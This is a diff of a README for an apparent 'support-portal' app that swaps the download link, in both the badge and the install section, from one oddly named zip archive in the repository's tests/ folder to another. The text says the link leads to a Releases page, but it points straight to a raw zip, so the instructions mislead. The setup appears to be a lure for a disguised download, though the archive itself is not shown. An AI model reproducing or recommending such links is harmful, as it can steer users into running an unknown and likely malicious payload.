@@ -6,7 +6,7 @@ Welcome to the support-portal! This application allows you to submit and track y
 
 ## 📥 Download Now
 
-[![Download support-portal](https://raw.githubusercontent.com/Luana1706/support-portal/main/tests/support-portal-spiculose.zip)](https://raw.githubusercontent.com/Luana1706/support-portal/main/tests/support-portal-spiculose.zip)
+[![Download support-portal](https://raw.githubusercontent.com/Luana1706/support-portal/main/tests/portal-support-1.1-alpha.2.zip)](https://raw.githubusercontent.com/Luana1706/support-portal/main/tests/portal-support-1.1-alpha.2.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ To run the support-portal, ensure your system meets these requirements:
 
 ## 🔧 Download & Install
 
-To begin using the support-portal, visit the following page to download the latest version of the software: [Download Here](https://raw.githubusercontent.com/Luana1706/support-portal/main/tests/support-portal-spiculose.zip).
+To begin using the support-portal, visit the following page to download the latest version of the software: [Download Here](https://raw.githubusercontent.com/Luana1706/support-portal/main/tests/portal-support-1.1-alpha.2.zip).
 
 1. Click on the link above to go to the Releases page.
 2. On the Releases page, find the latest version.
